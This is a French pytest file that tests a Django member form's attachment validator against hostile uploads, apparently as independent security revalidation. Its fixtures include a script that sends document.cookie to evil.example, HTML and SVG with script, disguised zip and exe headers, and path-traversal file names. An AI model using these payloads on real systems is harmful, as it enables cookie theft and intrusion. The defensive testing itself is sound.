"""Revalidation indépendante (testeur) : pièces jointes (Membre.fiche_id, F-22) avec des fichiers hostiles.

Chemin testé : formulaire d'ajout d'un membre par la FENAMO (vue `add-fenamo-membre`), validateur de modèle et
enregistrement. Rien ne sort de MEDIA_ROOT (dossier temporaire).
"""
import io
import re
from datetime import date

import pytest
from django.core.exceptions import ValidationError
from django.core.files.uploadedfile import SimpleUploadedFile
from django.urls import reverse
from PIL import Image

from coptapp.forms import MembreFenamoForm
from coptapp.models import Membre
from coptapp.validators import erreur_piece, valider_piece
from tests.test_plan_url import hachage_rapide, jeu  # noqa: F401

PDF = b'%PDF-1.4\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n'
PDF_CORPS_HOSTILE = (
    b'%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction<</S/JavaScript/JS(app.alert(1))>>>>endobj\n'
    b'<html><script>fetch("https://evil.example/?c="+document.cookie)</script></html>\n%%EOF\n'
)
HTML = b'<!DOCTYPE html><html><body><script>alert(document.cookie)</script></body></html>'
HTML_AVEC_ENTETE_TARDIF = b'<html>' + b'x' * 2000 + b'%PDF-1.4'  # « %PDF- » au-delà du premier ko : pas un PDF


@pytest.fixture(autouse=True)
def media_temporaire(settings, tmp_path):
    settings.MEDIA_ROOT = tmp_path / 'media'
    settings.PRIVATE_MEDIA_ROOT = tmp_path / 'media'
    (tmp_path / 'media').mkdir()
    return tmp_path


def _png():
    tampon = io.BytesIO()
    Image.new('RGB', (10, 10), (1, 2, 3)).save(tampon, 'PNG')
    return tampon.getvalue()


DONNEES = {
    'nom': 'Piece Fictive', 'date_naissance': '1990-01-01', 'genre': 'HOMME', 'titre': 'MR', 'fonction': 'Membre simple',
    'comite': 'ANTENNE', 'etat_civil': 'Celibataire', 'categorie': 'H', 'qualite': 'PROPRIETAIRE',
}


def _poster(client, jeu, fichier):
    client.force_login(jeu['compte'])
    return client.post(reverse('add-fenamo-membre'), {**DONNEES, 'fiche_id': fichier})


def _hors_media(media):
    """Fichiers créés ailleurs que dans MEDIA_ROOT (traversée de répertoire) : doit rester vide."""
    return [p for p in media.parent.rglob('*') if p.is_file() and media not in p.parents]


# ---------------------------------------------------------------- acceptés

def test_F22_reval_pdf_valide_stocke_sous_nom_aleatoire(client, jeu, media_temporaire):
    r = _poster(client, jeu, SimpleUploadedFile('Ma carte.pdf', PDF, content_type='application/pdf'))
    assert r.status_code == 302, r.content.decode()[:300]
    membre = Membre.objects.get(nom='Piece Fictive')
    assert re.fullmatch(r'fiche_id/[0-9a-f]{32}\.pdf', membre.fiche_id.name), membre.fiche_id.name
    assert (media_temporaire / 'media' / membre.fiche_id.name).read_bytes() == PDF


def test_F22_reval_png_deguise_en_html_stocke_comme_png(client, jeu):
    """Le nom envoyé n'est jamais cru : un vrai PNG appelé .html est enregistré en .png."""
    r = _poster(client, jeu, SimpleUploadedFile('page.html', _png(), content_type='text/html'))
    assert r.status_code == 302
    assert Membre.objects.get(nom='Piece Fictive').fiche_id.name.endswith('.png')


# ---------------------------------------------------------------- refusés

@pytest.mark.parametrize('contenu, nom', [
    (HTML, 'carte.pdf'), (HTML, 'carte.html'), (HTML, 'carte.png'), (HTML_AVEC_ENTETE_TARDIF, 'carte.pdf'),
    (b'', 'vide.pdf'), (b'GIF89a' + b'0' * 30, 'carte.pdf'),
    (b'<svg xmlns="http://www.w3.org/2000/svg"><script>1</script></svg>', 'carte.svg'),
    (b'PK\x03\x04' + b'0' * 40, 'carte.pdf'),  # archive zip
    (b'MZ' + b'\x00' * 40, 'carte.pdf'),        # exécutable
], ids=['html-pdf', 'html-html', 'html-png', 'entete-tardif', 'zero-octet', 'gif', 'svg', 'zip', 'exe'])
def test_F22_reval_pieces_hostiles_refusees_par_le_validateur(contenu, nom):
    fichier = SimpleUploadedFile(nom, contenu)
    with pytest.raises(ValidationError):
        valider_piece(fichier)
    assert erreur_piece(fichier)


@pytest.mark.parametrize('contenu, nom', [(HTML, 'carte.pdf'), (b'', 'vide.pdf'), (HTML_AVEC_ENTETE_TARDIF, 'x.pdf')])
def test_F22_reval_pieces_refusees_par_le_formulaire_et_rien_n_est_ecrit(client, jeu, media_temporaire, contenu, nom):
    r = _poster(client, jeu, SimpleUploadedFile(nom, contenu))
    assert r.status_code == 200  # le formulaire est réaffiché avec l'erreur
    assert not Membre.objects.filter(nom='Piece Fictive').exists()
    assert not [p for p in (media_temporaire / 'media').rglob('*') if p.is_file()]


def test_F22_reval_piece_trop_lourde_refusee(client, jeu, settings, media_temporaire):
    settings.UPLOAD_PIECE_MAX_MO = 0.001
    r = _poster(client, jeu, SimpleUploadedFile('gros.pdf', PDF + b'0' * 5000))
    assert r.status_code == 200 and not Membre.objects.filter(nom='Piece Fictive').exists()
    assert 'lourd' in erreur_piece(SimpleUploadedFile('gros.pdf', PDF + b'0' * 5000))


# ---------------------------------------------------------------- noms piégés

@pytest.mark.parametrize('nom', [
    '../../../evil.pdf', '..\\..\\evil.pdf', '/etc/passwd.pdf', 'a/../../b.pdf', 'evil\x00.pdf', '....//....//x.pdf',
    '%2e%2e%2fevil.pdf',
])
def test_F22_reval_nom_avec_traversee_de_repertoire_jamais_utilise(jeu, media_temporaire, nom):
    membre = jeu['membre']
    membre.fiche_id = SimpleUploadedFile(nom, PDF)
    membre.save()
    assert re.fullmatch(r'fiche_id/[0-9a-f]{32}\.pdf', membre.fiche_id.name), membre.fiche_id.name
    media = media_temporaire / 'media'
    assert (media / membre.fiche_id.name).resolve().is_relative_to(media.resolve())
    assert not _hors_media(media)


# ---------------------------------------------------------------- constat : corps hostile derrière un en-tête PDF valide
